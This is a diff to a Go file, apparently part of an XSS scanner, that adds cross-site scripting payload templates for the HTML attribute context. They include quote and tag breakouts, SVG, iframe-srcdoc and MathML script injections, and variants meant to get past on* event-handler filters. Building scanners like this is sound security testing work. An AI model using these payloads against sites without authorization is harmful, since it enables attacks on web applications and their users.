@@ -93,12 +93,20 @@ var payloadTemplates = map[context.ContextType][]PayloadTemplate{
 		{Value: `<x-xsr onload=alert(1)>`, Severity: model.High, Desc: "Custom element event handler"},
 	},
 	context.ContextHTMLAttrValue: {
+		// Quote breakout + event handler
 		{Value: `" onfocus="alert(1)" autofocus="`, Severity: model.High, Desc: "Double quote breakout + onfocus"},
 		{Value: `' onmouseover='alert(1)' style='display:block;width:100vw;height:100vh`, Severity: model.High, Desc: "Single quote breakout + onmouseover"},
 		{Value: `" onmouseover="alert(1)" style="position:fixed;top:0;left:0;width:100%;height:100%"`, Severity: model.High, Desc: "Mouseover hijack"},
-		{Value: `"><script>alert(1)</script>`, Severity: model.High, Desc: "Tag breakout"},
+		{Value: `"><script>alert(1)</script>`, Severity: model.High, Desc: "Tag breakout + script"},
 		{Value: `' onfocus=alert(1) autofocus='`, Severity: model.High, Desc: "Attribute breakout single quote"},
 		{Value: `" style="background:url(javascript:alert(1))`, Severity: model.Medium, Desc: "Style injection"},
+		// Non-event-handler payloads: bypass on* filters (e.g., onload→o_nload)
+		{Value: `"><svg><script>alert(1)</script>`, Severity: model.High, Desc: "Tag breakout + SVG script (no event handler)"},
+		{Value: `"><iframe srcdoc="<script>alert(1)</script>">`, Severity: model.High, Desc: "Tag breakout + iframe srcdoc"},
+		{Value: `"><a href=javascript:alert(1)>XSS</a>`, Severity: model.Medium, Desc: "Tag breakout + javascript link"},
+		{Value: `"><form action=javascript:alert(1)><button>X</button></form>`, Severity: model.Medium, Desc: "Tag breakout + form action"},
+		{Value: `"><math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>`, Severity: model.High, Desc: "Tag breakout + MathML script"},
+		{Value: `"><body onload=alert(1)>`, Severity: model.High, Desc: "Tag breakout + body onload"},
 	},
 	context.ContextURLAttr: {
 		{Value: `javascript:alert(1)`, Severity: model.High, Desc: "javascript: URI"},
